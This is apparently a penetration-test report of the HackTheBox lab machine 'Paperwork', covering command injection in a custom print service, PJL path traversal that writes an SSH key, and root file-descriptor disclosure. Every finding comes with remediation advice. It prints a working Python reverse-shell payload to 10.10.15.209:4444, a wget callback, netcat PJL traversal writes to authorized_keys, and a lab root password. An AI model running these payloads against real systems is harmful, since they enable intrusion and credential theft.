# 🎯 Machine Information


---
# 📋 General Information

| Field               | Value       |
| ------------------- | ----------- |
| 🖥️ Machine         | Paperwork   |
| 🌍 Platform         | HTB         |
| 💻 Operating System | Linux       |
| 🎯 Difficulty       | Easy        |
| 📅 Date Started     | 10/Ago/2026 |
| 📅 Date Finished    | 13/Ago/2026 |
| 👤 Author           | LazyTitan33 |

---
# 📄 Executive Summary

>The Paperwork machine was assessed from an external, unauthenticated perspective with the objective of identifying vulnerabilities that could lead to unauthorized access and full system compromise.
>
>Initial external reconnaissance identified SSH on TCP/22, HTTP on TCP/80, and a custom LPD-like service on TCP/1515. The HP JetDirect/PJL service on TCP/9100 was identified later during local post-exploitation enumeration from the `lp` context. During enumeration, a publicly accessible application archive was identified, exposing the source code of the custom LPD-like service. Analysis of the disclosed source code revealed an OS Command Injection vulnerability in the print-job processing functionality, which allowed unauthenticated Remote Code Execution and established the initial foothold in the `lp` security context.
>
>Post-exploitation enumeration from the `lp` context identified an internally accessible JetDirect/PJL service exposing file-system operations vulnerable to path traversal. This allowed an attacker-controlled SSH public key to be written to the `archivist` user's `authorized_keys` file, resulting in authenticated SSH access as `archivist`.
>
>From the `archivist` context, further local enumeration identified a root-executed `paperwork-daemon` that monitored a user-controlled log file and exposed a privileged Unix domain socket. By triggering the daemon's privileged code path, a root-opened file descriptor referencing `/etc/paperwork/admin_pins.conf` was transmitted to the unprivileged client through `SCM_RIGHTS`. The disclosed administrative credential was subsequently used to authenticate as `root`, resulting in complete compromise of the target host.
>
>Overall, the compromise demonstrated how multiple weaknesses could be chained from **unauthenticated network access → Remote Code Execution → local privilege escalation to `archivist` → privileged file-descriptor disclosure → credential disclosure → authenticated root access**.


###   🔗 Attack Chain
---
![](assets/Web%20Access%20and%20Privilege-2026-08-15-183843.png)
---
# 🌐 Attack Surface
 
## 🛰️ Open Services

| IP           | Port | Service         | Tec                   | Version        |
| ------------ | ---- | --------------- | --------------------- | -------------- |
| 10.129.87.16 |      |                 |                       |                |
|              | 22   | ssh             | OpenSSH               | 10.0p2         |
|              | 80   | http            | nginx                 | 1.28.0         |
|              | 1515 | Custom LPD-like | Custom Python service | Custom         |
|              | 9100 | JetDirect/PJL   | Printer service       | Local/Internal |


---
## 🌍 Domains

| 🖥️ IP       | 🌐 Domain     | 🌍 Subdomain | 📍 Status / Notes |
| :----------- | :------------ | :----------- | :---------------- |
| 10.129.87.16 | paperwork.htb | none         | 200               |



---

## ⚙️ Technologies

| Domain / IP           | Technology | Version | Notes                                                                                                      |
| --------------------- | ---------- | ------- | ---------------------------------------------------------------------------------------------------------- |
| http://paperwork.htb/ | nginx      | 1.28.0  | Informational landing page; no interactive application functionality was identified during the assessment. |



---

# 🔍 Reconnaissance

## Enumeration Commands

```bash
nmap -p22,80,1515 -sCV -oN Targeted 10.129.87.16
```

---

## Raw Output

```text
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=7%D=8/9%Time=6A791762%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printing
SF:\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20pr
SF:inting\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:luc_minus_circle:

```

---

## Analysis

>The initial Nmap scan identified three externally accessible network services: SSH on TCP/22, HTTP on TCP/80, and a custom LPD-like service on TCP/1515.
>
>TCP/80 redirected requests to the `paperwork.htb` virtual host, which was subsequently enumerated for exposed resources and application functionality. TCP/1515 returned the service-specific banner **“Archive_Printer is ready and printing.”**, indicating a custom printing implementation rather than a standard LPD service.
>
>Based on the externally exposed attack surface, further enumeration focused on the web application and the custom LPD-like service. The web application was subsequently found to expose an archive containing the source code of the TCP/1515 service, which provided additional insight into its implementation and led to the identification of the OS Command Injection vulnerability documented as **WEB-001**.
>
>After obtaining the initial foothold as `lp`, additional local enumeration was performed to identify services and resources that were not part of the initial external attack surface. This later revealed the JetDirect/PJL service on TCP/9100, which exposed file-system functionality and became relevant to the subsequent privilege escalation documented as **LPE-002**.

---
## Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260813133432.png)

---

# 🚨 Findings

## 🟣 WEB-001 —  OS Command Injection - Remote Code Execution

### 📋 Finding Metadata

| Field         | Value                                                                      |
| ------------- | -------------------------------------------------------------------------- |
| Finding ID    | WEB-001                                                                    |
| Severity      | 🟣 CRITICAL                                                                |
| Status        | Confirmed                                                                  |
| Domain        | paperwork.htb                                                              |
| Endpoint      | LPD Service — port 1515/tcp                                                |
| IP            | 10.129.87.16                                                               |
| Service       | Custom Python-based LPD-like Service                                       |
| Version       | N/A                                                                        |
| Vulnerability | Unauthenticated OS Command Injection - Remote Code Execution               |
| CVE           | N/A                                                                        |
| CWE           | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |
| OWASP         | A03:2021 Injection                                                         |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                               |
| Score         | 9.8                                                                        |

---

### 📝 Description

>An unauthenticated OS command injection vulnerability was identified in a custom Python-based LPD-like service exposed on TCP/1515. The vulnerability exists in the print job processing functionality, where the `job_name` value is extracted from client-controlled job data and subsequently incorporated directly into a shell command executed through Python's `subprocess.Popen()` with `shell=True`. Because the application does not adequately neutralize shell metacharacters or otherwise constrain the supplied value before passing it to the system shell, an unauthenticated remote attacker can manipulate the resulting command and execute arbitrary operating-system commands on the underlying server. Successful exploitation provides Remote Code Execution (RCE) within the security context of the `paperwork-daemon` process. During the assessment, the vulnerability was successfully validated by crafting a malicious print job that modified the resulting shell command and demonstrated arbitrary command execution on the target system.
---
### ⚠️ Risk

Successful exploitation allows an attacker to:

- Execute arbitrary operating-system commands on the target server.
- Obtain Remote Code Execution (RCE) without requiring authentication.
- Access sensitive files and system resources available to the vulnerable service account (`lp`).
- Execute malicious commands within the security context of the vulnerable service.
- Establish an initial foothold on the underlying Linux host for further post-exploitation activity.
- Access application data, configuration files, and potentially exposed credentials available to the compromised service account.
- Chain the vulnerability with additional local vulnerabilities or misconfigurations to achieve privilege escalation and potentially obtain higher-privileged access.

---
### 🔎 Discovery

#### Command

```bash
python3 pocTrue.py -p 1515 -q archive_intake -j "x'; wget http://10.10.15.209:8877/; echo '" 10.129.87.16
```
#### Output

```bash
python3 -m http.server 8877
Serving HTTP on 0.0.0.0 port 8877 (http://0.0.0.0:8877/) ...
10.129.87.16 - - [13/Aug/2026 14:04:33] "GET / HTTP/1.1" 200 -
```
#### Analysis

>During service enumeration, TCP/1515 was identified as a custom Python-based LPD-like printing service. Further investigation of the `/download/archive` endpoint, documented separately as **WEB-002**, revealed an exposed archive containing the source code of the service. Reviewing `server.py` provided visibility into the request-processing logic and identified that the `job_name` value was extracted from attacker-controlled print-job data and subsequently incorporated into a system command executed through Python's `subprocess.Popen()` function with `shell=True`.

>To determine whether the input could influence command execution, a controlled out-of-band validation was performed by supplying a crafted value through the `job_name` parameter. The payload caused the target to initiate an HTTP request to an attacker-controlled listener. The resulting request was observed successfully, confirming that attacker-controlled input reached the system shell and that arbitrary command execution was possible.

---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260813140830.png)
---

### 🧠 Technical Analysis

>The root cause of the vulnerability is the direct incorporation of attacker-controlled input into a shell command. The application extracts the job name from the submitted print-job data and assigns it to the `job_name` variable. This value is subsequently embedded directly into a command string passed to `subprocess.Popen()` with `shell=True`.
>
>Because the value originates from unauthenticated network input and is not adequately validated or neutralized before being passed to the shell, an attacker can manipulate shell interpretation and alter the intended command execution flow.
>
>The vulnerable data flow can be summarized as unauthenticated network input → print job metadata → `job_name` → shell command construction → `subprocess.Popen(..., shell=True)` → operating-system command execution.
>
>The vulnerability was classified as **CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**. Successful exploitation resulted in Remote Code Execution against the target system.
---
### 💥 Exploitation
#### Payload

```bash
python3 pocTrue.py -p 1515 -q archive_intake -j "x'; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.209\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'; echo '" 10.129.87.16

```

---
#### Expected Result

>The service should process `job_name` strictly as application data and should not allow user-controlled input to modify the structure of an operating-system command. The application should avoid shell interpretation when executing system operations and should pass fixed command arguments directly to the subprocess execution mechanism. Malicious characters or unexpected input supplied through the print-job metadata should either be safely treated as data or rejected by server-side validation, without resulting in additional command execution.

#### Actual Result

>The service accepted attacker-controlled input through the print-job `job_name` field and incorporated the supplied value directly into a shell command executed with `shell=True`. The crafted input altered the resulting command and caused the target to execute an attacker-controlled operating-system command. This confirmed that an unauthenticated remote attacker could achieve arbitrary command execution through the TCP/1515 service.
---
#### Evidence
📷 Screenshot

![[Pasted image 20260813141808.png|1228]]

---
## 🎯 Impact

An unauthenticated attacker was able to achieve **Remote Code Execution on the underlying Linux host** through the exposed LPD-like service.

Successful exploitation resulted in:

- Execution of arbitrary operating-system commands.
- Remote command execution without requiring valid application credentials.
- Execution of commands within the security context of the `paperwork-daemon` process.
- Access to files, processes, and system resources available to the compromised service.
- Potential disclosure of sensitive application and system information.
- Establishment of an initial foothold for subsequent post-exploitation activity.
- Potential privilege escalation when chained with additional local vulnerabilities or misconfigurations.

This vulnerability represented a direct path from **unauthenticated network access to operating-system level command execution** and served as the primary initial compromise vector for the target host.

---
### 🔧 Remediation

To remediate this vulnerability:

- Remove `shell=True` from the affected `subprocess.Popen()` invocation and avoid invoking a system shell when shell interpretation is not required.
- Pass commands and their arguments as a structured list rather than constructing commands through string interpolation.
- Treat `job_name` as untrusted input and enforce strict server-side validation using an allowlist of permitted characters and an appropriate maximum length.
- Reject malformed or unexpected print-job metadata before processing it.
- Avoid passing network-controlled input to command-execution functions such as `subprocess`, `os.system()`, `eval()`, or `exec()`.
- Run `paperwork-daemon` under a dedicated **least-privileged service account** with only the permissions required for its operation.
- Restrict network access to TCP/1515 to authorized hosts or trusted network segments where external access is not required.
- Review the service source code for additional instances of unsafe command construction and user-controlled input handling.
- Review the affected host for evidence of unauthorized command execution and remove any artifacts generated during exploitation.
---

### 📚 References

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **OWASP Top 10 2021 — A03: Injection**
- **OWASP — OS Command Injection**
- **Python Documentation — `subprocess` module**
- **RFC 1179 — Line Printer Daemon Protocol**


---
## 🟡 WEB-002 — Source Code / Archive Exposure

### 📋 Finding Metadata

| Field         | Value                                                                                     |
| ------------- | ----------------------------------------------------------------------------------------- |
| Finding ID    | WEB-002                                                                                   |
| Severity      | 🟡 MEDIUM                                                                                 |
| Status        | Confirmed                                                                                 |
| Domain        | paperwork.htb                                                                             |
| Endpoint      | /download/archive                                                                         |
| IP            | 10.129.87.16                                                                              |
| Service       | Nginx                                                                                     |
| Version       | 1.28.0                                                                                    |
| Vulnerability | Sensitive Source Code / Backup File Exposure                                              |
| CVE           | N/A                                                                                       |
| CWE           | CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory) |
| OWASP         | A05:2021 Security Misconfiguration                                                        |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                                              |
| Score         | 5.3                                                                                       |

---

### 📝 Description

>A sensitive source code disclosure vulnerability was identified in the publicly accessible `/download/archive` endpoint hosted on `paperwork.htb`. The endpoint exposed a downloadable archive containing the source code of a custom Python-based LPD-like service running on TCP/1515.
>
>The issue was caused by sensitive application source code being exposed through a publicly accessible download location without appropriate access restrictions. An unauthenticated attacker could retrieve and inspect the archive, revealing the internal implementation and request-processing logic of the LPD-like service, including the handling of attacker-controlled print job data.
>
>Successful exploitation of this information disclosure allowed an attacker to obtain detailed knowledge of the underlying service implementation and identify security-sensitive functionality, including the OS Command Injection vulnerability documented separately as **WEB-001**.The disclosed source code significantly reduced the effort required to identify and validate the underlying command-injection vulnerability in the associated service.

---

### ⚠️ Risk

Successful exploitation allows an attacker to:

- Download internal application source code without authentication.
- Obtain detailed information about the implementation of the exposed service.
- Identify internal processing logic, network services, and data-handling mechanisms.
- Identify security-sensitive functionality and potentially vulnerable code paths.
- Reduce the effort required to develop targeted attacks against the exposed service.
- Chain the information disclosure with additional vulnerabilities, including the OS Command Injection documented in **WEB-001**, to achieve Remote Code Execution.

---

### 🔎 Discovery

#### Command

```bash
curl -s http://paperwork.htb/
```

#### Output

```html
<td>Internal Processor</td>
                <td><a href="/download/archive"><code>paperwork-archive-v1.02</code></a> 
```

```html
<tr>
    <td>Target Queue</td>
    <td><code>archive_intake</code></td>
</tr>
```
#### Analysis

>During web enumeration, the application's HTML source code was reviewed to identify additional functionality and resources that were not immediately exposed through the primary interface. The source code revealed a publicly accessible `/download/archive` endpoint associated with the application's internal archive-processing functionality.
>
>The same interface exposed a **Target Queue** value of `archive_intake` within the system configuration information. This provided additional context about the application's printing functionality and established a relationship between the web application and the LPD-like service subsequently identified on TCP/1515.
>
>The `/download/archive` endpoint was then accessed directly to determine whether the referenced archive was publicly retrievable.

---

#### Evidence

📷 Screenshot :
![](assets/Pasted%20image%2020260813144232.png)

![](assets/Pasted%20image%2020260813145600.png)
---

### 🧠 Technical Analysis

>The exposed endpoint returned an archive containing the source code of a custom Python-based LPD-like service. The archive contained `server.py`, which implemented the network service responsible for processing print jobs on TCP/1515.
>
>Review of the disclosed source code revealed internal implementation details that would normally not be required by an external user, including socket handling, print-job processing logic, queue validation, command-processing workflow, and interaction with the underlying operating system.
>
>The disclosure was particularly significant because the source code provided direct visibility into security-sensitive functionality that could otherwise have required extensive black-box analysis. Static review of `server.py` revealed the unsafe use of attacker-controlled print-job data within a shell command executed through `subprocess.Popen(..., shell=True)`. This behavior directly enabled the identification and subsequent validation of the **OS Command Injection vulnerability documented as WEB-001**.
>
>The issue therefore represents more than the exposure of implementation details: the disclosed source code materially reduced the effort required to identify and reproduce a critical vulnerability within the associated service.

---

### 💥 Exploitation

#### Payload

```bash
curl -X GET http://paperwork.htb/download/archive -o Archive.zip
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1138 100   1138   0      0   6243      0                            0
```

```bash
❯ unzip archive.zip
Archive:  archive.zip
  inflating: server.py  
```

```python
❯ head -n 17 server.py

import socket
import threading
import subprocess
import os


VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:............
```

The complete source code recovered from the exposed archive is provided in **Appendix A — Source Code Disclosure** for technical reference and reproducibility.

---
#### Expected Result

> The `/download/archive` endpoint should not expose application source code, internal service implementations, configuration files, backup archives, or other sensitive development artifacts to unauthenticated users. If archive functionality is required for legitimate application operations, the returned archive should contain only files explicitly intended for external access and should be protected by appropriate access controls. Sensitive source files such as `server.py` should remain inaccessible from publicly exposed download locations.
---
#### Actual Result

>The `/download/archive` endpoint was accessible without authentication and returned an archive containing the application's internal Python source code. The archive could be downloaded directly from the web server and extracted locally, revealing `server.py`, which contained the implementation of the custom LPD-like service running on TCP/1515.
>
>The disclosed source code exposed internal processing logic and security-sensitive functionality, including the handling of attacker-controlled print-job data and the command-execution mechanism that was subsequently identified as the root cause of **WEB-001**.
---
#### Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260813145442.png)

---

## 🎯 Impact

>An unauthenticated attacker was able to retrieve and analyze internal source code belonging to a network-exposed service.

Successful exploitation resulted in:

- Unauthorized disclosure of proprietary application source code.
- Exposure of internal service implementation and request-processing logic.
- Disclosure of the relationship between the web application and the LPD-like service.
- Disclosure of the `archive_intake` target queue and associated processing functionality.
- Reduced effort required to identify security weaknesses within the exposed service.
- Facilitation of the **CWE-78 OS Command Injection** vulnerability documented in **WEB-001**.

While the source code exposure did not independently provide operating-system access, the disclosed implementation materially facilitated the identification and subsequent exploitation of the Critical vulnerability affecting the associated LPD-like service.`

---
### 🔧 Remediation

To remediate this vulnerability:

- Remove application source code and internal development artifacts from publicly accessible download locations.
- Ensure archive-generation functionality includes only files explicitly intended for external access.
- Store source code and deployment files outside directories or endpoints exposed through the web server.
- Implement appropriate authentication and authorization controls for sensitive download functionality.
- Review web-server configuration to ensure that internal files, source code, backups, archives, and configuration artifacts cannot be retrieved directly.
- Implement an allowlist of permitted files or resources that may be returned by download endpoints.
- Perform regular reviews of publicly accessible directories and endpoints for accidentally exposed source code, archives, configuration files, and backup artifacts.
- Implement automated security checks to detect source-code and sensitive-file exposure before deployment.
- Review the disclosed source code for additional vulnerabilities and remediate any issues identified as a result of the exposure.

---
### 📚 References

- **CWE-538:** Insertion of Sensitive Information into Externally-Accessible File or Directory
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP Top 10 2021 — A05: Security Misconfiguration**
- **OWASP — Information Exposure**

---
# 🔐 Credentials

| Username    | Password                      | Source                   | Privilege  | Valid     |
| ----------- | ----------------------------- | ------------------------ | ---------- | --------- |
| `archivist` | SSH public-key authentication | PJL arbitrary file write | Local user | Confirmed |
| root        | ApparelMortuaryCedar22        | Privileged FD disclosure | Root       | Confirmed |

---

# 🚪 Initial Access

## Method

>Initial access was obtained by exploiting the OS Command Injection vulnerability in the custom LPD-like service exposed on TCP/1515.
>
>The vulnerability allowed unauthenticated attacker-controlled data contained within the print-job job_name field to alter a shell command executed by the service. Successful exploitation resulted in arbitrary command execution within the security context of the paperwork-daemon process.
>
>A reverse shell was subsequently established, providing an interactive shell as the lp user.

---

## Commands

```bash
python3 pocTrue.py -p 1515 -q archive_intake -j "x'; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.209\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'; echo '" 10.129.87.16
```

---

## Session Information

| Field   | Value         |
| ------- | ------------- |
| User    | lp            |
| Shell   | /usr/bin/bash |
| Service | LPD           |
| Port    | 4444          |

---




# ⬆️ Privilege Escalation

## 🔴LPE-001 - Improper Trust Boundary / Privileged File Descriptor Disclosure

### 📋 Finding Metadata

| Field          | Value                                                           |
| -------------- | --------------------------------------------------------------- |
| Finding ID     | LPE-001                                                         |
| Severity       | 🔴 High                                                         |
| Status         | Confirmed                                                       |
| Host           | paperwork.htb                                                   |
| Source Context | archivist                                                       |
| Target Context | root                                                            |
| Component      | paperwork-daemon / privileged management socket                 |
| Target         | /run/paperwork/mgmt.sock                                        |
| Vulnerability  | Improper Trust Boundary / Privileged File Descriptor Disclosure |
| CVE            | N/A                                                             |
| CWE            | CWE-668: Exposure of Resource to Wrong Sphere                   |
| OWASP          | A01:2021 – Broken Access Control                                |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H                    |
|                |                                                                 |
### 📝 Description

>After obtaining access as the archivist user, a privileged Python daemon named paperwork-daemon was identified running as root. The service monitored the user-controlled log file /home/archivist/printer/logs/commands.log and exposed a Unix domain socket at /run/paperwork/mgmt.sock.
>
>The daemon trusted the contents of commands.log to determine whether a security violation had occurred. When specific trigger strings such as FSQUERY, FSUPLOAD, or FSDOWNLOAD were present, the daemon executed a privileged response routine named trigger_lockdown().
>
>During this routine, the service opened the protected file /etc/paperwork/admin_pins.conf with root privileges and  transmitted the already-open privileged file descriptor to connected clients without enforcing an appropriate authorization boundary using the Unix socket mechanism SCM_RIGHTS.
>
>By writing a trigger string into the monitored log file and connecting to the management socket, a low-privileged user was able to receive a root-opened file descriptor that should have remained confined to the privileged daemon. Reading the descriptor disclosed sensitive administrative credentials, which were subsequently used to obtain authenticated root access through SSH.
### 🕵️‍♂️ Enumeration

```bash
ps aux | grep -v "kworker*" | grep -v "scsi*" | grep -v "irq*"
```
### 📜Result
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260813215546.png)

---

### 🔬Analysis

>Enumeration identified a custom service named `paperwork-daemon` executing with elevated privileges as `root`. Code review revealed that during initialization, the service opened `/etc/paperwork/admin_pins.conf` and maintained the privileged file descriptor in memory: `admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)`. Additionally, the daemon actively monitored a user-controlled log file located at `LOG_PATH = "/home/archivist/printer/logs/commands.log"`, to which the low-privileged user `archivist` possessed write permissions. When the `scan_for_malice()` routine detected specific keywords (`FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`) within this log file, it invoked the privileged function `trigger_lockdown(conn)`.
>
>Within `trigger_lockdown()`, the service bundled both the log file descriptor and the pre-opened privileged descriptor (`evidence_bundle = array.array("i", [log_fd, admin_fd])`) and passed them across a Unix domain socket via `SCM_RIGHTS` using `conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])`. This introduced a critical trust-boundary violation: a low-privileged user could intentionally trigger the lockdown handler and receive an open file descriptor pointing to `/etc/paperwork/admin_pins.conf`. Consequently, the protected file could be read directly from memory, completely bypassing standard filesystem access controls. This occurs because access checks are performed when the privileged process opens the file; once the descriptor is transferred through `SCM_RIGHTS`, the receiving process can read from the already-authorized descriptor without reopening the file.

---
### 💥 Exploitation

>The trigger condition was activated by inserting the monitored keyword into the writable log file.

```bash
printf 'FSQUERY\n' >> /home/archivist/printer/logs/commands.log
```

>A Unix socket client was then executed to connect to the privileged management socket and receive any file descriptors transmitted through `SCM_RIGHTS`.

```python
printf '%s\n' 'import socket,array,os' 's=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM);s.connect("/run/paperwork/mgmt.sock");f=array.array("i");m,a,_,_=s.recvmsg(4096,socket.CMSG_SPACE(f.itemsize*4));print(m.decode(errors="replace"));[f.frombytes(d[:len(d)-len(d)%f.itemsize]) for l,c,d in a if l==socket.SOL_SOCKET and c==socket.SCM_RIGHTS];print("Received FDs:",list(f));[print(f"\n--- FD {x} ---\n"+os.read(x,4096).decode(errors="replace")) for x in f]' > /tmp/getfd.py && python3 /tmp/getfd.py
```

>The daemon entered the `trigger_lockdown()` routine and transmitted two file descriptors to the client. The second descriptor was verified to reference the privileged file `/etc/paperwork/admin_pins.conf`.
>
>Reading this descriptor disclosed the administrative secret contained in the file, which was subsequently used to authenticate as `root` via SSH and obtain full administrative access to the target host.

---

### 📜 Result

>A root shell was obtained after extracting the administrative credential from the privileged file descriptor and authenticating successfully as `root` through SSH.

#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260813223931.png)

### 🎯Impact

>A low-privileged user with write access to `commands.log` and connect access to `/run/paperwork/mgmt.sock` was able to trigger a privileged code path in a root-executed daemon and obtain a root-opened file descriptor through `SCM_RIGHTS`.

Successful exploitation resulted in:

- Bypass of filesystem permission boundaries.
- Disclosure of protected administrative credentials.
- Unauthorized access to a root-only configuration resource.
- Conversion of a local file-descriptor disclosure into authenticated root access.
- Authenticated root access resulting in full administrative control of the target host.

This vulnerability represents a privilege-boundary failure in which a root service exposed a privileged resource to a non-privileged context without enforcing an appropriate authorization mechanism.

---
### 🔧 Remediation

To remediate this privilege escalation vulnerability, the following actions are recommended:

- Never use user-controlled log files as security-decision inputs.
- Remove the use of `SCM_RIGHTS` for transmitting privileged file descriptors to untrusted clients.
- Open sensitive files only when required and close them immediately after use.
- Enforce strict authorization on `/run/paperwork/mgmt.sock` and restrict access to trusted administrative users only.
- Execute `paperwork-daemon` with a dedicated low-privileged service account instead of `root`.
- Separate logging functionality from privileged management functionality.
- Validate that any information returned through the socket is explicitly authorized for the requesting user.
- Audit all Unix domain socket services for unsafe descriptor passing and privilege-boundary violations.
- Add security tests to ensure that privileged descriptors cannot be disclosed to non-privileged contexts.
- Review the handling of sensitive configuration files such as `/etc/paperwork/admin_pins.conf` and migrate secrets to a protected credential storage mechanism.



---
## 🔴 LPE-002 - Arbitrary File Write via PJL Path Traversal

### 📋 Finding Metadata

| Field          | Value                                                                    |
| -------------- | ------------------------------------------------------------------------ |
| Finding ID     | LPE-002                                                                  |
| Severity       | 🔴 High                                                                  |
| Status         | Confirmed                                                                |
| Host           | paperwork.htb                                                            |
| Source Context | lp                                                                       |
| Target Context | archivist                                                                |
| Component      | HP JetDirect                                                             |
| Target         | /home/archivist/.ssh/authorized_keys                                     |
| Vulnerability  | Arbitrary File Write via PJL Path Traversal                              |
| CVE            | N/A                                                                      |
| CWE            | CWE-22 (Path Traversal) / CWE-73 (External Control of File Name or Path) |
| OWASP          | A01:2021 – Broken Access Control                                         |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H                             |


### 📝 Description

>A local privilege escalation vulnerability was identified in the HP JetDirect/PJL service exposed on TCP/9100. The service exposed file-system operations including `FSDIRLIST`, `FSDOWNLOAD`, and `FSUPLOAD` without adequately restricting the file paths supplied by the client.
>
>By manipulating the `NAME` parameter with directory traversal sequences, a low-privileged attacker with access to the service could access or modify files outside the intended printer file-system location. During the assessment, this behavior was used to write an attacker-controlled SSH public key to `/home/archivist/.ssh/authorized_keys`.
>
>Because SSH subsequently trusted the newly added public key, the attacker was able to establish an authenticated SSH session as the `archivist` user. This resulted in a privilege escalation from the initial low-privileged `lp` context to the more privileged `archivist` account. The service was only reachable from the compromised host during the assessment, and the attack vector was therefore evaluated as Local (AV:L).
### 🕵️‍♂️Enumeration

```bash
printf "@PJL FSDOWNLOAD NAME=\"0:../../../../tmp/poc.txt\" SIZE=5\r\nHELLO\x1b%%-12345X" | nc 127.0.0.1 9100
```
### 📜Result

```bash
@PJL FSUPLOAD NAME="0:../../../../tmp/poc.txt" SIZE=5
HELLO
```

####  Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260813194559.png)

---

### 🔬 Analysis

>During local privilege-escalation enumeration, the process and network services accessible from the `lp` context were reviewed. TCP/9100 was identified as an HP JetDirect/PJL-based service. Further interaction with the service revealed file-system functionality through the `FSDIRLIST`, `FSDOWNLOAD`, and `FSUPLOAD` operations.
>
>The `NAME` parameter accepted client-controlled file paths. By supplying directory traversal sequences such as `../`, it was possible to reference locations outside the intended printer file-system namespace.
>
>A controlled test was performed by targeting a file under `/tmp`. Successful interaction with the service confirmed that the supplied path was not properly restricted to the expected file-system location. This established the arbitrary file access/write primitive that was subsequently used to target the `archivist` user's SSH configuration. 
---
### 💥Exploitation

```bash
ssh-keygen -t ed25519 -f /tmp/htb_key -N ""
```

An Ed25519 SSH key pair was generated on the attacker-controlled system. The corresponding public key was prepared for insertion into the target user's `authorized_keys` file.

```bash
printf '@PJL FSDOWNLOAD NAME="0:../../../home/archivist/.ssh/authorized_keys" SIZE=90\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGWzUlAbOJx9oggQkY1/nVrz98zo3j/WK7HLsl6TLWCu stven@Hack4u\n' | nc 127.0.0.1 9100
```

The crafted PJL request leveraged the previously identified path traversal vulnerability to write the attacker-controlled public key to the `archivist` user's `authorized_keys` file.

```bash
ssh -i /tmp/htb_key archivist@paperwork.htb
```
---
### 📜Result

>The SSH connection was successfully established as the `archivist` user using the corresponding attacker-controlled private key, confirming successful privilege escalation from the `lp` context.

####  Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260813193004.png)

### 🎯Impact

>An attacker operating from the low-privileged `lp` context was able to abuse the PJL service to write an attacker-controlled SSH public key into the `archivist` user's authentication configuration.

Successful exploitation allowed the attacker to:

- Escape the intended PJL file-system directory through path traversal.
- Write attacker-controlled data to a file belonging to another local user.
- Modify the SSH authentication configuration for `archivist`.
- Establish an authenticated SSH session as `archivist`.
- Obtain a more privileged and stable interactive shell.
- Continue subsequent local privilege-escalation activities from the `archivist` context.

This vulnerability therefore transformed a restricted file-write primitive available from the `lp` context into **local privilege escalation and unauthorized access to the `archivist` account**.


### 🔧 Remediation

To remediate this privilege-escalation vector:

- Implement strict server-side validation of all PJL file paths.
- Reject directory traversal sequences such as `../` and equivalent encoded representations.
- Resolve and canonicalize requested paths before performing file operations.
- Enforce that all file operations remain within the intended printer storage directory.
- Apply filesystem permissions following the principle of least privilege.
- Prevent the JetDirect/PJL service from writing to users' home directories or SSH configuration files.
- Run the service under a dedicated account with only the minimum permissions required for printer operations.
- Restrict access to TCP/9100 to trusted hosts or network segments where possible.
- Disable PJL file-system functionality if it is not required for legitimate operations.
- Review existing user SSH configuration files for unauthorized modifications or keys.
- Monitor sensitive files such as `~/.ssh/authorized_keys` for unexpected changes.

---

# 🖥️ Post Exploitation

## 👥 Users

| **User**    | **Description**                                             | **Access Obtained**    |
| ----------- | ----------------------------------------------------------- | ---------------------- |
| `lp`        | Service account associated with the custom printing service | Initial foothold       |
| `archivist` | Local user account                                          | Privilege escalation   |
| `root`      | Administrative account                                      | Full system compromise |

---
## 🗂️Interesting Files

| File                                        | Description                                         | Security Relevance                |
| ------------------------------------------- | --------------------------------------------------- | --------------------------------- |
| `/tmp/archive.log`                          | Archive-processing log generated by the LPD service | Related to initial RCE            |
